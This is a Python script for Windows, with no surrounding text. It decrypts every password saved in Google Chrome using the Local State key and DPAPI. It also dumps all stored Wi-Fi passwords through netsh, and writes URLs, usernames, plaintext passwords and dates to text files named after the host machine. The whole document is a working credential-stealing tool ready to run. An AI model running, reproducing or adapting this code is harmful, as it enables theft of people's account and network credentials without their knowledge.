import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import subprocess


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    # Local_computer_directory_path will look
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def wifi_passwords():
    machine_name = subprocess.check_output("hostname").decode("utf-8").split("\r\n")[0]
    data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
    wifis = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]
    file = open(f"{machine_name}.txt", "a")
    file2 = open(f"{machine_name}_not_found.txt", "a")
    try:
        for wifi in wifis:
            results = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key=clear"]).decode(
                "utf-8").split("\n")
            results = [line.split(":")[1][1:-1] for line in results if "Key Content" in line]
            try:
                # print(f"Wifi name: {wifi}\nPassword: {results[0]}")
                file.write(f"Wifi name: {wifi}\nPassword: {results[0]}\n")
            except IndexError:
                # print(f"Wifi name: {wifi}\nPassword: Not found")
                file2.write(f"Wifi name: {wifi}\nPassword: Not found\n")
    except Exception as e:
        # print(wifi, "is causing an error\n", e)
        file2.write(f"{wifi} is causing an error\n {e}")


def main():
    wifi_passwords()
    machine_name_chrome = subprocess.check_output("hostname").decode("utf-8").split("\r\n")[0]
    file_chrome = open(f"{machine_name_chrome}_nice.txt", "a")
    # file2_chrome = open(f"{machine_name_chrome}_not_found.txt", "a")
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            file_chrome.write(f"Main URL: {main_url}\nLogin URL: {login_page_url}\nUser name: {user_name}\nDecrypted Password: {decrypted_password}\n")
            # print(f"Main URL: {main_url}")
            # print(f"Login URL: {login_page_url}")
            # print(f"User name: {user_name}")
            # print(f"Decrypted Password: {decrypted_password}")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            file_chrome.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")
            # print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")

        if last_usuage != 86400000000 and last_usuage:
            file_chrome.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")
            # print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        file_chrome.write("=" * 100 + "\n")
        # print("=" * 100)
    cursor.close()
    db.close()

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()